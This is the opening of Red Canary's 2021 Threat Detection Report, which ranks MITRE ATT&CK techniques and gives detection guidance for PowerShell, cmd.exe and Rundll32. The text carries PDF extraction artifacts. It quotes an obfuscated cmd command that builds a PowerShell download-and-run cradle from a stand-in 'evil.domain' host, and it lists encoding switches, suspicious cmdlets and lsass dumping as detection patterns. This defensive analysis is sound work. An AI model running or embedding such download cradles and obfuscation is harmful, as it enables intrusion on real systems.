2021 Threat
Detection Report 2
0
2
1
2021 Threat Detection Report
TO PT ECHNIQUES
10
INTRODUCTIO N3
METHODOLOG Y5
OTHE RT HRE AT S
119
TO PT HRE AT S
78
TABL EO FC ONTENTS
\# 1T1059 Command and Scripting Interpreter11T1059\.001 PowerShell
12T1059\.003 Windows Command Shell 
16 
\# 2T1218 Signed Binary Process Execution 
20
T1218\.011 Rundll3221T1218\.005 Mshta26
\# 3T1543 Create and Modify System Process 
33
T1543\.003 Windows Service
34\#4T1053 Scheduled TaskJob 
39
T1053\.005 Scheduled Task
40 
\# 5T1003 OS Credential Dumping47
T1003\.001 LSASS Memory
48
\# 6T1055 Process Injection53
\# 7T1027 Obfuscated Files or Information 
58
\# 8T1105 Ingress Tool Transfer64 
\# 9T1569 System Services69 
T1569\.002 Service Execution
70\#10T1036 Masquerading73
T1036\.003 Rename System Utilities
74\#1TA55179 
\# 2Cobalt Strike84
\# 3Qbot88
\# 4IcedID92
\# 5Mimikatz96
\# 6Shlayer100
\# 7Dridex103
\# 8Emotet107
\# 9TrickBot112
\# 10Gamarue115
3
Welcome to the 2021
Threat Detection ReportThis in\-depth look at the most prevalent ATT\&CK techniques is designed to help 
you and your team focus on what matters most.Getting started 
Welcome to Red Canarys 2021 Threat Detection Report. Based on in\-depth 
analysis of roughly 20,000 confirmed threats detected across our customers 
environments, this research arms security leaders and their teams with 
actionable insight into the malicious activity and techniques we observe
most frequently.
Using the MITRE ATT\&CK framework as scaffolding, our analysis offers a birds 
eye view of the malicious behaviors that youre most likely to encounterand 
empowers you to address those threats head on with detailed detection 
strategies that you can implement immediately. Whether youre a CSO weighing 
next years infosec budget, an intel analyst on the tails of a specific threat actor, 
or an engineer looking to tune your detection logic, the Threat Detection Report 
has insight for security professionals of all stripes.
How to use the report: 
 
Start perusing the most prevalent techniques and threats to see what weve 
observed in our customers environments
 
Explore how to detect and mitigate specific threats and techniques with 
ideas and recommendations from our detection engineers, researchers, 
and intelligence analysts
 
Talk with your team about how the ideas, recommendations, and priorities 
fit into your security controls and strategy
INTRODUCTION
INVESTIGATIVE LEADS
CONFIRMED THREATS
REPORT
14M
20K
1
2021 Threat Detection Report
l Introduction
4
2021 Threat Detection Report
More granular 
analysis 
MITRE ATT\&CKs adoption of
sub\-techniques transformed the
overall structure of the report as
well as the scope of Red Canarys
technique analysis.
Intel\-fortified 
Our Intelligence Team compiled the 
top 10 most prevalent threats we 
encountered in 2020, putting the top 10 
techniques in context with malware and 
other activity that leverages them.
The return of
the PDF 
You asked, we listened! By popular 
demand, this years report is available 
not only in web format, but also in PDF 
format so you can annotate it to your 
hearts content.
WH AT SN E WI N2 0 2 1
AcknowledgementsIt takes an army to produce a research piece of this magnitude. Thanks to 
the detection engineers, researchers, intelligence analysts, writers, editors, 
designers, developers, and project managers who invested countless hours in 
this reportand the operational work its derived from. And a huge thanks to 
the MITRE ATT\&CK team, whose framework has helped the community take a 
giant leap forward in understanding and tracking adversary behaviors.
l Introduction
5
MethodologySince 2013, Red Canary has delivered high\-quality threat detection to 
organizations of all sizes. Our platform collects hundreds of terabytes of 
endpoint telemetry every day, surfacing evidence of threats that are analyzed 
by our Cyber Incident Response Team (CIRT). Confirmed threats are tied to 
corresponding MITRE ATT\&CK techniques to help our customers clearly 
understand what is happening in their environments. This report is a summary 
of confirmed threats derived from this data.
Creating metrics around techniques and threats is a challenge for any 
organization. To help you better understand the data behind this report and 
to serve as a guide for how you can create your own metrics, we want to share 
some details about our methodology.
Behind the data 
2021 Threat Detection ReportTo understand our data, you need to understand how we detect malicious and 
suspicious behavior in the first place. We gather telemetry from our customers 
endpoints and feed it through a constantly evolving library of detection 
analytics. Each detection analytic is mapped to one or more ATT\&CK techniques 
and sub\-techniques, as appropriate. When telemetry matches the logic in
one of our detection analytics, an event is generated for review by our
detection engineers.
l Methodology
6
2021 Threat Detection Report
When a detection engineer determines that one or more events for a specific 
endpoint surpasses the threshold of suspicious or malicious behavior, a 
confirmed threat detection documenting the activity is created for that 
endpoint. These confirmed threat detections inherit the ATT\&CK techniques 
that were mapped to the analytics that alerted us to the malicious or suspicious 
behaviors in the first place.
Its important to understand that the techniques and sub\-techniques were 
counting are based on our analyticsand not on the review performed by our 
detection engineers, during which they include more context into detections. 
Weve chosen this approach out of efficiency and consistency. However, the 
limitation of this approach is that context gleaned during the investigation of a 
threat does not contribute to its technique mapping, and, by extension, some 
small percentage of threats may be mapped incorrectly or impartially. That said, 
we continually review these confirmed threats, and we do not believe that there 
are a significant number of mapping errors in our dataset.
Changes in ATT\&CKIn 2020, MITRE released a version of ATT\&CK that effectively added a new 
dimension to the matrix, in the form of sub\-techniques. We took this change as 
an opportunity to comprehensively review the thousands of detection analytics 
wed created over the years. In addition to specifically realigning our analytics so 
that they would map to sub\-techniques, we were also able to standardize how 
we mapped our analytics to ATT\&CK in general. This sort of mapping may seem 
straightforward, but it really isnt. Over a period of years, we had many different 
people interpreting the framework in many different ways. Naturally, this led to 
a level of inconsistency that we wanted to fix. We implemented new guidelines 
for mapping detection analytics to techniques and applied this to our entire 
library.
We recommend that any organization mapping to ATT\&CK (or any framework) 
create a set of standard guidelines for analysts. While frameworks seem simple, 
the choice of how to map information is a subjective human decision, and 
guidelines help keep everyone aligned.
The changes we made in mapping our detection analytics resulted in a more 
accurate representation of techniques being used. However, our remapping 
effort to sub\-techniques means that it is difficult to compare our 2021 Threat 
Detection Report to last years report. While we realize this causes some 
confusion, we believe updating to the latest ATT\&CK version ensures a solid 
foundation in the data underlying our report.l Methodology
7
2021 Threat Detection Report
Okay, so how do you count?Now that weve explained how we map to MITRE, you may be wondering how we 
tally the scores for the Threat Detection Report. Our methodology for counting 
technique prevalence has largely remained consistent since the original report 
in 2019\. For each malicious or suspicious detection we published during the 
year, we incremented the count for each technique reflected by a detection 
analytic that contributed to that detection. (We excluded data from detections 
of unwanted software from these results.) If that detection was remediated, 
and the host was reinfected at a later date, a new detection would be created, 
thus incrementing the counts again. While this method of counting tends to 
overemphasize techniques that get reused across multiple hosts in a single 
environment (such as when a laterally moving adversary generates multiple 
detections within a single environment), we feel this gives appropriate weight to 
the techniques you are most likely to encounter as a defender.
For the purposes of this report, we decided to set our rankings based on 
techniques, even though the majority of our analysis and detection guidance will 
be based on sub\-techniques. This seemed to be the most reasonable approach, 
considering the following:
 
Sometimes we map to a technique that doesnt have sub\-techniques
 
Sometimes we map to sub\-techniques
 
Sometimes we map generally to a technique but not to its subs
We acknowledge the imperfection of this solution, but we also accept that this 
is a transition year for both ATT\&CK and Red Canary. In cases where a parent 
technique has no subs or subs that we dont map to, we will analyze the parent 
technique on its own and provide detection guidance for it. However, in cases 
where sub\-technique detections are rampant for a given parent technique, 
we will focus our analysis and detection guidance entirely on sub\-techniques 
that meet our requirements for minimum detection volume. To that point, we 
decided to analyze sub\-techniques that represented at least 20 percent of the 
total detection volume for a given technique. If no sub\-technique reached the 20 
percent mark, then we analyzed the parent.
What about threats?New to this years report is a ranking of the 10 most prevalent threats we 
encountered in 2020\. The Red Canary Intelligence Team seeks to provide 
additional context about threats to help improve decision\-making. By 
understanding what threats are present in a detection, customers can better 
understand how they should respond. Throughout 2020, the Intelligence Team 
sought to improve how we identified and associated threats in detections. We 
l Methodology
8
2021 Threat Detection Report
chose to define threats broadly as malware, threat groups, activity clusters, 
or any other threat. We took two main approaches to associating a detection to 
a threat: automatically associating them based on patterns identified for each 
specific threat and manually associating them based on intelligence analyst 
assessments conducted while reviewing each detection.
All that said, how did we tally the numbers for the most prevalent threats? In 
contrast to our technique methodology, we counted threats by the unique 
environments affected. Whereas for techniques we counted multiple detections 
within the same customer environment as distinct tallies, for threats we 
decided to only count by the number of customers who encountered that threat 
during 2020\. This is due to the heavy skew introduced by incident response 
engagements for laterally moving threats that affect nearly every endpoint in an 
environment (think ransomware).
Had we counted threats by individual detections, ransomware and the 
laterally moving threats that lead up to it (e.g Cobalt Strike) would have been 
disproportionately represented in our data. We believe counting in this way 
gives an appropriate measure of how likely each threat is to affect any given 
organization, absent more specific threat modeling details for that organization. 
It also serves as a check against the acknowledged bias in the way we count 
technique prevalence.
LimitationsThere are a few limitations to our methodology for counting threats, as there are 
for any approach. Due to the nature of our visibility (i.e that we predominantly 
leverage endpoint detection and response data), our perspective tends to weigh 
more heavily on threats that made it through the external defensessuch as 
email and firewall gatewaysand were able to gain some level of execution on 
victim machines. As such, our results are likely different than what you may see 
from other vendors focused more on network or email\-based detection. For 
example, though phishing is a generally common technique, it didnt make it 
into our top 10\.
Another important limitation to our counting method may seem obvious: we 
identify threats we already know about. As our nascent Intelligence Team began 
in 2019, it wasnt until mid\-2020 that we began to thoroughly review all malicious 
detections in earnest. And while we have built a considerable knowledge base 
of intelligence profiles, the vast and ever\-changing threat landscape presents 
many unique threats that we are unable to associate (though in some cases we 
have been able to cluster these under new monikers such as Blue Mockingbird 
or Silver Sparrow). If we are able to identify a repeatable pattern for a certain 
threat and automate its association, we observe the threat more often.
l Methodology
9
2021 Threat Detection Report
This means that while the top 10 threats are worth focusing on, they are 
not the only threats that analysts should focus on, since there may be other 
impactful ones that are unidentified and therefore underreported. Despite 
these flaws, we believe that the analysis and detection guidance across the 
threats and techniques in this report is reflective of the overall landscape, and, 
if implemented, offers a great deal of defense\-in\-depth against the threats that 
most organizations are likely to encounter.
Knowing the limitations of any methodology is important as you determine 
what threats your team should focus on. While we hope our top 10 threats and 
detection opportunities help prioritize threats to focus on, we recommend 
building out your own threat model by comparing the top threats we share in 
our report with what other teams publish and what you observe in your
own environment.
l Methodology
10
2021 Threat Detection Report
Top TechniquesThe following chart illustrates the ranking of MITRE ATT\&CK techniques 
associated with confirmed threats across our customers environments. We 
counted techniques by total threat volume, and the percentages below are a 
measure of each techniques share of overall detection volume. Since multiple 
techniques can be mapped to any confirmed threat, the percentages below add 
up to more than 100 percent.
1
6
2
7
3
8
4
9
5
10
T1059 Command
and Scripting Interpreter
T1218 Signed Binary
Process Execution
T1543 Create and
Modify System Process
T1027 Obfuscated Files
or Information
T1053 Scheduled Task Job
T1003 OS Credential Dumping
T1055 Process Injection
T1105 Ingress Tool Transfer
T1569 System Services
T1036 Masquerading
24% of total threats
19% 
16% 
16% 
7% 
7% 
6% 
5% 
4% 
4% 
l Top Techniques
11
Command and
Scripting InterpreterCommand and Scripting Interpreter tops our list this year thanks in large part to 
detections associated with two of its sub\-techniques: PowerShell and Windows 
Command Shell.
TECHNIQU ET 1 0 5 9
OVERALL RANK
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 1
72\.2%
4,798
2021 Threat Detection Report
PowerShell
Windows Command Shell
T 1 0 5 9 . 0 0 1
T 1 0 5 9 . 0 0 3
PowerShell was the most common technique we observed in 2020, 
affecting nearly half of our customers. It remains among the most 
versatile of built\-in utilities for adversaries, defenders, and system 
administrators alike.
While it doesnt do much on its own, Windows Command Shell can 
call on virtually any executable on the system to execute batch files 
and arbitrary tasks.
ORGANIZATIONS AFFECTED
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
CONFIRMED THREATS
48\.7%
38\.4%
2,366
1,984
SE EM ORE\>
SE EM ORE\>
T 1 0 5 9 :COMMAN DA N DS CRIPTING
Adversaries may abuse command and script interpreters to execute commands, 
scripts, or binaries. These interfaces and languages provide ways of interacting with 
computer systems and are a common feature across many different platforms. Most 
systems come with some built\-in command\-line interface and scripting capabilities, 
for example, macOS and Linux distributions include some flavor of Unix Shell while 
Windows installations include the Windows Command Shell and PowerShell.
PREVALEN TS UB \-TECHNIQUES
11 l T1059: Command and Scripting Interpreter
12
PowerShellPowerShell was the most common technique we observed in 2020, affecting 
nearly half of our customers. It remains among the most versatile of built\-in 
utilities for adversaries, defenders, and system administrators alike.
Analysis
Why do adversaries use PowerShell?PowerShell is a versatile and flexible automation and configuration 
management framework built on top of the .NET Common Language Runtime 
(CLR), which expands its capabilities beyond other common command\-line and 
scripting languages. PowerShell is included by default in modern versions of 
Windows.
Adversaries use PowerShell to obfuscate commands in hopes of achieving any of 
the following:
 
evading detection
 
spawning additional processes
 
downloading and executing remote code and binaries
 
gathering information
 
changing system configuration 
Adversaries rely on PowerShells versatility and ubiquitous presence on target 
systems, minimizing the need to additionally customize payloads.
How do adversaries use PowerShell?While PowerShell offers adversaries a plethora of options, the most common 
uses include:
 
executing commands
 
leveraging encoded commands
 
obfuscation (with and without encoding)
 
downloading additional payloads
 
launching additional processes
TECHNIQU ET 1 0 5 9 . 0 0 1
PARENT TECHNIQUE RANK
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 1
48\.7%
2,366
2021 Threat Detection Report
l T1059\.001: PowerShell
13
PowerShell is frequently observed in phishing campaigns, where emails with 
weaponized attachments containing embedded code launch a payload. In many 
cases, such as with Emotet, this payload executes encoded and obfuscated 
PowerShell commands that download and execute additional code or a 
malicious binary from a remote resource.
We encounter encoding or obfuscation more than any other variety of malicious 
or suspicious PowerShell. PowerShells flexibilityalong with its support for 
aliases, abbreviated cmdlets, argument names, and calling .NET methods
offers attackers many ways to invoke Base64 and other encoding. Below is a 
case\-agnostic review of the methods we commonly observe in rank order, with 
approximate percentages representing their frequency of occurrence in our 
detections:
 
27%: \-e
 
25%: \-ec
 
21%: \-encodecommand
 
15%: \[System.Convert]::FromBase64String()
 
6%: \-encoded
 
4%: \-enc
 
1%: \-en
 
.4%: \-encod
 
.01%: \-enco
 
\< .01%: \-encodedco, \-encodedc, \-en^c
Given PowerShells support for shortened command\-line arguments,
escape characters in the command line, and more, do not consider the above
list comprehensive.
Emerging Windows Command
Shell tradecraft 
While leveraging PowerShell, adversaries have been known to use format 
string obfuscation (i.e the dynamic building of strings by using non\-standard 
sequences of format string operators like {0} and {1}) instead of Base64 encoding. 
Weve also encountered different mechanisms to obfuscate commands and 
payloads; these not only leverage common characters for obfuscation (such as ^ 
or \+), but also variables that are broken up initially to help evade detection and 
then concatenated back together for execution.
2021 Threat Detection Report
T 1 0 5 9 . 0 0 1 :
POWERSHELL
Adversaries may abuse PowerShell 
commands and scripts for execution. 
PowerShell is a powerful interactive 
command\-line interface and scripting 
environment included in the Windows 
operating system. Adversaries can 
use PowerShell to perform a number 
of actions, including discovery of 
information and execution of code. 
Examples include the Start\-Process 
cmdlet which can be used to run an 
executable and the Invoke\-Command 
cmdlet which runs a command locally 
or on a remote computer (though 
administrator permissions are required 
to use PowerShell to connect to
remote systems).
l T1059\.001: PowerShell
14
Detection 
Collection requirements
Process and command\-line monitoringCommand\-line parameters are by far the most efficacious for detecting 
potentially malicious PowerShell behavior, at least as far as standard process 
telemetry is concerned. Logs such as Anti\-Malware Scan Interface (AMSI), script\-
block, or Sysmon can be particularly helpful for detecting PowerShell.
Detection opportunities
Encoding command switchEncoding and obfuscation tend to go together. Watch for the execution 
of powershell.exe with command lines that include variations of the 
\-encodecommand argument; PowerShell will recognize and accept anything 
from \-e onward, and it will show up outside of the encoded bits. The following 
are example variations on the shortened, encoded command switch:
 
\-e
 
\-ec
 
\-encodecommand
 
\-encoded
 
\-enc
 
\-en
 
\-encod
 
\-enco
This is a starting point, so be prepared for some initial noise as you implement 
and tune this detection logic. 
Base64 encodingBase64 encoding isnt inherently suspicious, but its worth looking out for in a 
lot of environments. As such, looking for the execution of a process that seems 
to be powershell.exe along with a corresponding command line containing the 
term base64 is a good way to detect a wide variety of malicious activity. Beyond 
alerting on PowerShell that leverages Base64 encoding, consider leveraging 
a toollike CyberChef, for examplethat is capable of decoding encoded 
commands. 
2021 Threat Detection Report
l T1059\.001: PowerShell
15
2021 Threat Detection Report
DETECTIONSTR AT EGIST
Frank is responsible for building and 
maintaining the Red Canary CIRT 
training program. He leads all aspects 
including onboarding new employees 
and fostering the development of 
new or expanding skillsets. Frank 
is an accomplished cyber security 
investigator and information assurance 
practitioner with deep experience in 
digital forensics and incident response 
(DFIR). He paid his dues in DFIR 
consulting before going on to manage 
security operations for a national 
financial services firm, where he built 
and led the team responsible for 
continuous monitoring, threat analysis, 
and incident response.
Frank McClain 
CIRTTRAININ GL EAD
ObfuscationOnce decoded (from Base64\), you may encounter compressed code, more 
Base64 blobs, and decimal, ordinal, and obfuscated commands. Obfuscation 
(whether inside or outside the encoding) breaks up detection methodologies by 
splitting commands or parameters, inserting extra characters (that are ignored 
by PowerShell), and other janky behavior. You can use regular expressions (such 
as regex) to increase fidelity and help flag more interesting activity from within 
the decoded sections. Monitoring for the execution of PowerShell with unusually 
high counts of characters like ^, \+, $, and % may help you detect suspicious and 
malicious behavior.
Suspicious cmdletsOnce the command line is decoded to human\-readable text, you can also watch 
for various cmdlets, methods, and switches that may indicate malicious activity. 
These may include strings such as Invoke\-Expression (or variants like iex and 
.invoke), the DownloadString or DownloadFile methods, or unusual switches like 
\-nop or \-noni.
Weeding out false positivesMonitoring for encoded commands may seem like an easy win, and it is certainly 
a place to start. However, you will quickly find that many platforms and 
administrators leverage PowerShell and use encoded commands as a part of 
normal workflows. As such, flagging activity simply based on variations of the 
\-encodedcommand switch may generate a significant amount of noise. Start 
with queries against offline or static data to get a feel for volume.
Once you have a better understanding of your overall volume, identify patterns 
within the decoded data. Leverage your knowledge of what is normal for your 
environment in order to identify what is potentially malicious. Automation is 
critical to not just detecting encoded commands, but the contents of those 
commands once decoded. Prior to applying detection logic, feed encoded 
command lines into a workflow that decodes them; that way, you are increasing 
fidelity from the start.
l T1059\.001: PowerShell
16
Windows Command ShellWhile it doesnt do much on its own, Windows Command Shell can call
on virtually any executable on the system to execute batch files and
arbitrary tasks.
Analysis
Why do adversaries use Windows 
Command Shell?Windows Command Shell is ubiquitous across all versions of Windows and, 
unlike its more sophisticated and capable cousin, PowerShell, the Windows 
Command Shell takes no dependencies on specific versions of .NET. While 
Command Shells native capabilities are limited, they have been stable for years, 
maybe even decades. Adversaries know that if cmd.exe works in their lab, its 
going to work in the field.
The Windows Command Shell is the no\-frills field general in an adversarys 
arsenal. It may not be able to do much on its own, but it is capable of calling on 
virtually any executable on the system to carry out its mission.
Because Command Shell can execute batch files, adversaries can use it to 
reliably and repeatedly execute arbitrary tasks.
How do adversaries use Windows 
Command Shell?In a review of more than 1,000 confirmed threat detections, we found cmd.exe 
called more than 6,000 times in more than 4,000 unique command lines across 
hundreds of customer environments. PowerShell was a child process of cmd 
in more than 480 instances. We saw more than 350 references to unique batch 
files and 270 unique scheduled tasks calling cmd across more than 30 customer 
environments.
One of the most commonly observed techniques is the use of cmd to call native 
commands and redirect the output of those commands to a file on the local 
admin share, for example:
TECHNIQU ET 1 0 5 9 . 0 0 3
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 1
38\.4%
1,984
2021 Threat Detection Report
l T1059\.003: Windows Command Shell
PARENT TECHNIQUE RANK
17
This technique is consistent with Impacket, an open source tool that adversaries 
use to manipulate networking protocols. We observed similar patterns of 
execution and output redirection nearly 400 times across more than a dozen 
customer environments.
Emerging Windows Command
Shell tradecraft 
Windows Command Shell was originally released in 1987 and, though it has new 
user\-interface features in Windows 10, it has a relatively limited set of built\-in 
commandscommands that may be invoked without starting a new process 
on the system. This old dog isnt really doing new tricks. In the last quarter of 
2020, we observed 11 detections for cmd.exe replacing utilman.exe enabling 
authentication bypass. The only Windows Command Shell detections with 
higher frequency counts in that quarter involved suspected red team activity 
and similar internal testing tools.
Having said that, if there is anything novel involving cmd.exe, it may be 
obfuscation. In the spring of 2018, Daniel Bohannon released a whitepaper on 
DOS obfuscation techniques and a framework called Invoke\-DOSfucation for 
creating obfuscated DOS command lines that could be used to evade simple, 
signature\-based detections and slow down human analysis. In our data set of 
more than 1,000 detections involving the Windows Command Shell, we found 91 
unique command lines involving some measure of obfuscation. The most heavily 
obfuscated DOS command we observed was similar to the one shown here:
2021 Threat Detection Report
l T1059\.003: Windows Command Shell
18
In the Windows Command Shell, the caret (^) character is an escape character. 
When it precedes special characters, like the pipe (\|) character or file redirection 
operators (\<\>), those special characters will be treated as normal characters. 
When the caret symbol precedes non\-special characters, nothing special 
happens; it is effectively ignored. So the command above becomes:
Looking at this command carefully, we can see it sets a variable named N1 to 
a string containing a PowerShell command that is reversed. Theres a For loop 
that reverses this string and executes it. The PowerShell command creates a 
download cradle to download a file and invokes it via a call to Invoke\-Item.
While these obfuscated commands may evade simple, signature\-based 
detections, analytics that look for commonly used obfuscation techniques, such 
as the presence of caret characters, can easily detect them. Layered detection 
analytics will also help. If a detection misses the obfuscated DOS commands, 
another detection may trigger on the PowerShell download cradle, the call to 
Invoke\-Item, or a DNS lookup to an unusual domain.
Detection 
Collection requirements
Process and command\-line monitoringWindows Security Event Logsspecifically Process Creation (ID 4688\) events 
with command\-line argument logging enabledwill be the best source of 
observing and detecting malicious usage of the Windows Command Shell. 
Having a good understanding of baseline scripts and processes that call the 
Windows Command Shell is essential to reducing noise and combating potential 
false positive alerts.
2021 Threat Detection Report
cmd VCset N1\=}
}{hctac};kaerb;iB$ metI\-
ekovnI;
)iB$ ,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni 
dq$(hcaerof;exe.
\+Kjm$\+
\+cilbup:vne$\=iB$;963 
\= Kjm$;
)@
(tilpS.detcefni\=l?php.suoicilam
niamod.live

:ptth\=tlm$;tneilCbeW.teN tcejbo\-
wen\=cAB$ llehsrewop\&\&for L %R in (265;\-1;0\)do 
set ZR\=!ZR!
!N1:\~%R,1!\&\&if %R\=\=0 call %ZR:\*ZR!\=%
T 1 0 5 9 . 0 0 3 :
WINDOWSCOMMAN DS HELL
Adversaries may abuse the Windows 
command shell for execution. The 
Windows command shell (cmd.exe) 
is the primary command prompt 
on Windows systems. The Windows 
command prompt can be used to 
control almost any aspect of a system, 
with various permission levels required 
for different subsets of commands.
l T1059\.003: Windows Command Shell
19
Detection requirements
Focus on the uncommon patterns of execution and patterns of execution 
commonly associated with malice. If youre trying to detect various flavors of 
obfuscation, consider monitoring for the following:
Consider stripping the following characters from your command line before 
applying your detection logic: ( ) ^
Though cmd.exe itself is fairly limited in its capabilities, it has many tools it can 
call into the fight. Having a good understanding of those tools is essential to 
detecting malicious use of Windows Command Shell.
Weeding out false positives
Unfortunately, the best data source for detecting malicious use of the Windows 
Command ShellProcess Creation events with command\-line arguments 
captured (Event ID 4688 in the Windows Security Event log)will also be the 
primary source of false positives. Understanding your environment and how 
Windows Command Shell is normally used will help you separate the wheat from 
the chaff. Create filters to bucket normal usage, unusual usage, and suspicious 
or known malicious usage to build a successful detection pipeline that doesnt 
overwhelm analysts with false positives.
2021 Threat Detection Report
 
the execution of a process that seems to be cmd.exe in conjunction with a 
command line containing high numbers of characters that suggest the use 
of obfuscation, like ^, \= , % , ! , \[ , ( , ;
 
excessive use of the set and call commands in the context of a cmd.exe 
process
 
unusually high numbers of multiple whitespaces in the command line
 
redirection of output to the localhosts admin share: e.g \> 
computernamec$
 
execution of commands associated with other attack techniques
(such as calls to regsvr32\.exe or regasm.exe that load unusual dynamic
link libraries)
 
calls to reg.exe that modify registry keys to enable or disable things like 
Remote Desktop or User\-Access\-Control, or that write data to or read from 
unusual registry keys
DETECTIONSTR AT EGIST
Matt has worked the majority of his 
security career in offense, facilitating 
his application of an attackers mindset 
to detection engineering, which 
involves developing detection evasion 
strategies. By pointing out gaps in 
detection coverage, Matt is able to 
effectively offer actionable detection 
improvement guidance. Matt loves to 
apply his reverse engineering skills 
to understand attack techniques 
at a deeper level in order to more 
confidently contextualize them, 
understand relevant detection optics, 
and to understand the workflow 
attackers use to evade security 
controls. Matt is committed to making 
security research both accessible
and actionable.
Matt Graeber 
DIRECTO RO FTHRE AT RESEARCH
l T1059\.003: Windows Command Shell
20
Signed Binary
Proxy ExecutionSigned Binary Proxy Execution ranks second this year thanks in large part to 
detections associated with two of its sub\-techniques: Rundll32 and Mshta.
TECHNIQU ET 1 2 1 8
OVERALL RANK
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 2
49\.3%
3,755
2021 Threat Detection Report
Rundll32
Mshta
T 1 2 1 8 . 0 1 1
T 1 2 1 8 . 0 0 5
Adversaries use this native Windows process to execute malicious 
code through dynamic link libraries (DLL), often to bypass 
application controls.
Mshta is attractive to adversaries both in the early and latter stages 
of an infection because it enables them to proxy the execution of 
arbitrary code through a trusted utility.
ORGANIZATIONS AFFECTED
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
CONFIRMED THREATS
30%
18\.8%
2,380
738
SE EM ORE\>
SE EM ORE\>
T 1 2 1 8 :SIGNE DB INAR YP ROCES SE XECUTION
Adversaries may bypass process andor signature\-based defenses by proxying 
execution of malicious content with signed binaries. Binaries signed with trusted digital 
certificates can execute on Windows systems protected by digital signature validation. 
Several Microsoft signed binaries that are default on Windows installations can be used 
to proxy execution of other files.
PREVALEN TS UB \-TECHNIQUES
20 l T1218: Signed Binary Proxy Execution
21
Rundll32Adversaries use this native Windows process to execute malicious code through 
dynamic link libraries (DLL), often to bypass application controls.
Analysis
Why do adversaries use Rundll32?Like many of the most prevalent ATT\&CK techniques, Rundll32 is a native 
Windows process thats installed by default on nearly every Microsoft computer 
dating back to Windows 95\. It is a functionally necessary component of the 
Windows operating system that cant be simply blocked or disabled. This 
necessity and ubiquity makes Rundll32 an attractive target for adversaries 
intent on blending in.
From a practical standpoint, Rundll32 enables the execution of native dynamic 
link libraries (DLL). Executing malicious code as a DLL allows an adversary 
to keep their malware from appearing directly in a process tree, as a directly 
executed EXE would. Additionally, adversaries are known to abuse export 
functionality in legitimate DLLs, including those that can facilitate connection 
to network resources to bypass proxies and evade detection. Under certain 
conditions, particularly if you lack controls for blocking DLL loads, the execution 
of malicious code through Rundll32 can bypass application controls.
Beyond DLLs, Rundll32 can also execute JavaScript via the 
RunHtmlApplication function.
How do adversaries use Rundll32?Adversaries abuse Rundll32 in a wide variety of ways, so well limit our focus to 
variations we encounter regularly.
Adversaries often leverage Rundll32 to load code from DLLs within world\-
writable directories (e.g the Windows temp directory), a pattern of behavior 
that you might see from legitimate enterprise software as well as not\-so\-legit 
tools like Cobalt Strike.
As weve covered on the Red Canary blog, adversaries use Rundll32 to load the 
TECHNIQU ET 1 2 1 8 . 0 1 1
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 2
30%
2,380
2021 Threat Detection Report
l T1218\.001: Rundll32
PARENT TECHNIQUE RANK
22
legitimate comsvcs.dll, which calls the MiniDump function, allowing adversaries 
to dump the memory of certain processes. Weve observed adversaries 
leveraging this technique to retrieve cached credentials from lsass.exe, which is 
illustrated below.
DllRegisterServer is a legitimate function of Rundll32 that is used for a variety of 
innocuous reasons. However, weve also seen several threatsfrom droppers for 
Qbot, Dridex, and others to ransomware such as Egregor and Mazeleverage it 
as a mechanism to bypass application controls. The following illustrates
a generic example of an adversary using DllRegisterServer to bypass
application controls.
Another detectable example we encounter frequently with Rundll32 involves 
Cobalt Strike, which leverages the StartW function to load DLLs from the 
command line. The use of that export function is a telltale sign you are dealing 
with Cobalt Strike. The following is an example of what that might look like:
In what might be an example of a malicious scheduled task, weve also observed 
backdoors that leverage taskeng.exe to spawn Rundll32 and execute malicious 
code.
2021 Threat Detection Report
l T1218\.001: Rundll32
23
2021 Threat Detection Report
Last and perhaps least frequently, we observe a decent amount of USB worm 
activity wherein Rundll32 executes in conjunction with a command line 
containing non\-alphanumeric or otherwise unusual command\-line characters. 
We most frequently see this with Gamarue, as in the example below.
Detection 
Collection requirements
Command\-line monitoringProcess command\-line parameters are one of the most reliable sources to detect 
malicious use of Rundll32, since you need to pass command\-line arguments for 
Rundll32 to execute.
Process monitoringProcess monitoring is another fruitful data source for observing malicious 
l T1218\.001: Rundll32
24
2021 Threat Detection Report
execution of Rundll32\. Understanding the context in which Rundll32 executes is 
critically important to an investigation. Sometimes the execution of Rundll32 by 
itself wont be enough to determine malicious intent, and thats when you can 
rely on process lineage to gain additional context.
Detection suggestionsSome successful analytics for detecting malicious use of Rundll32 include
the following: 
Execution from world\-writable foldersSince adversaries will try to use Rundll32 to load or write DLLs from world or 
user\-writable folders, it makes sense to watch for rundll32\.exe writing or loading 
files to or from any of the following locations:
 
%APPDATA%
 
%PUBLIC%
 
%ProgramData%
 
%TEMP%
 
%windir%system32microsoftcryptorsamachinekeys
 
%windir%system32tasks\_migratedmicrosoftwindowsplasystem
 
%windir%syswow64tasksmicrosoftwindowsplasystem
 
%windir%debugwia
 
%windir%system32tasks
 
%windir%syswow64tasks
 
%windir%tasks
 
%windir%registrationcrmlog
 
%windir%system32comdmp
 
%windir%system32fxstmp
 
%windir%system32spooldriverscolor
 
%windir%system32spoolprinters
 
%windir%system32spoolservers
 
%windir%syswow64comdmp
 
%windir%syswow64fxstmp
 
%windir%temp
 
%windir%tracing
Export functionalitiesYou should also consider monitoring for instances of rundll32\.exe running 
Windows native DLLs that have export functionalities that adversaries commonly 
T 1 2 1 8 . 0 1 1 : 
RUNDLL 3 2
Adversaries may abuse rundll32\.exe 
to proxy execution of malicious code. 
Using rundll32\.exe, vice executing 
directly (i.e Shared Modules), may 
avoid triggering security tools that may 
not monitor execution of the rundll32\.
exe process because of allowlists or 
false positives from normal operations. 
Rundll32\.exe is commonly associated 
with executing DLL payloads.
l T1218\.001: Rundll32
25
2021 Threat Detection Report
DETECTIONSTR AT EGIST
Rodrigo is a detection engineer at 
Red Canary, where he spends his 
time finding new threats, building 
automation to reduce workloads, 
and delivering consistent threat 
detections to customers and partners. 
Prior to Red Canary, Rodrigo worked 
at General Electric in various roles 
spanning incident response, detector 
development, and threat hunting. In his 
spare time, he enjoys working on smart 
home automation, playing tennis, 
traveling, and spending time with
his family.
Rodrigo Garcia 
DET EC TIONENGINEER
leverage for executing malicious code and evading defensive controls.
Rundll32 without a command lineRundll32 does not normally execute without corresponding command\-line 
arguments and while spawning a child process. Given this, you may want to 
